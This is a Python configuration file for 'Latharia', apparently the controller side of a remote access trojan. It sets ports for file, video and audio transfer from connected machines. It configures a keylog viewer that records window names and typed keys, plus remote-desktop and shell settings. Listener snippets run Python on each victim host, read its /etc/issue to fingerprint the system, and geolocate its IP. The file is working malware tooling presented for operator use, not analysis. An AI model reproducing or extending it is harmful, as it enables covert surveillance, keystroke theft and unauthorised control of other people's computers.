import sys
import os
import blessed

sys.path.insert(0, os.path.dirname(os.path.realpath(__file__)))

# The introduction banner.
# Nothing much here.
intro_banner = """
ooooo                      .   oooo                            o8o            
`888'                    .o8   `888                            `"'            
 888          .oooo.   .o888oo  888 .oo.   oooo d8b  .oooo.   oooo   .oooo.   
 888         `P  )88b    888    888P"Y88b  `888""8P `P  )88b  `888  `P  )88b  
 888          .oP"888    888    888   888   888      .oP"888   888   .oP"888  
 888       o d8(  888    888 .  888   888   888     d8(  888   888  d8(  888  
o888ooooood8 `Y888""8o   "888" o888o o888o d888b    `Y888""8o o888o `Y888""8o 
-----------------------------------------------------------------------------
 
"""

intro_message = """
Welcome to the Latharia client! Here, you may enter any Python command and it shall execute!
You may also enter some commands here, such as the one to upload a file to the server
Type $h() for some help!\n
"""

# General configuration settings
globals()["t"] = blessed.Terminal()

# The prompt which displays text when you type
PROMPT = globals()["t"].bold_green("{cwd}:λαθραία~>")

# Port settings
PORT = 44444 # The base connection port
PROTOCOL_PORT = PORT + 1 # Unused, to be implemented later
DATA_PORT = PORT + 2 # This port is used for file transfers
VIDEO_PORT = PORT + 3 # This port is for transferring video
AUDIO_PORT = PORT + 5 # This port is for transferring audio
SHOW_DEBUG = True # This toggles the debugging messages. I recommend that you keep this enabled.

# Paths
# These configure where things from your connections will go
SERVER_FOLDER = "connections"
CONNECTION_NAME_FORMAT = "{server_folder}/{ip}_{callsign}/"
FILES_DIR = "files/" # This is the folder which will have all downloaded files in


# Miscellaneous
help_menu = {
    "$": "Execute Python trailing after the $",
    "$start_screen()": "Start the screen client with a function.",
    "$stop_screen()": "Stop the screen client, hopefully.",
    "$clear()": "Clear the screen."
}

# Listener functions

# Configure how the listener displays your connections
# Each array element will be executed. For instance, on every connection, the listener will do this
# In order to actually do something, you should know you are executing Python code at this point.
# You also need to know the variables. Simply put:
# ip = The IP that was just detected
# port = The port that was just detected
# callsign = The callsign that was just detected
# Additionally, you may run 'send_and_get_command(COMMAND, connfd)' to send a python statement to the
# server and return the result. If you're still confused, look in listener.py yourself.

listener_displays = [
    """
# Print basic information
print("{number}: Connection from {ip}, with callsign {callsign}!".format(
    ip = addr[0], callsign = callsign, number = len(array_mem_people) - 1
))
    """,

    """
# Print distribution!
their_distro = send_and_get_command("print(open('/etc/issue', 'r').read())", connfd).lower().split()[0]
print("Distro: {distro}".format(distro = their_distro))
    """,

    """
# Get country!
try:
    ipinfo = requests.get("http://ipinfo.io/{ip}".format(ip = ip)).json()
    print("Country: {country}".format(country = ipinfo["country"]))
except:
    pass

    """
]

# Keylog Viewer Options
keylog_format = """
[{time}]-[{window_proc_name}]-[{window_name}]
---------------------------------------------
{keys}
"""

# If it does not exist, it will be created.
keylog_dir = "keylogs/"

# Remote desktop settings
client_screen_sleeping_interval = .1 # in secs

# Advanced settings

# This is the amount of data generally received by the client.
# If you find that your shell() keeps cutting out, increase this amount
BUFFER_RECEIVE_SIZE = 4096 
COMMAND_SLEEP_SPEED = 0 # This is the number of seconds the program waits in between loops
